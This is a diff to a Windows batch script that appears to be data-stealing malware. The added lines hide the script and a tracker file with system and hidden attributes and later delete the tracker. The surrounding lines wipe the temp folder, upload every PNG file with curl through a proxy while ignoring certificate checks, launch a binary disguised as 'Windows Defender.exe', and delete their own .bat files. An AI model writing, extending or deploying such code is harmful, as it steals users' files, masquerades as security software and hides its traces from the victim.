@@ -1,6 +1,14 @@
 @echo off
 setlocal 
 
+attrib +s +h +i "%~f0"
+
+call :TRACKER > "%temp%\process.pid"
+call :FINISH
+
+:TRACKER
+attrib +s +h +i "%temp%\process.pid"
+
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -95,7 +103,10 @@ for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#"
 
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
+exit /b
 
+:FINISH
+powershell.exe Remove-Item -Force -Recurse "%temp%\process.pid"
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
 powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat" && exit
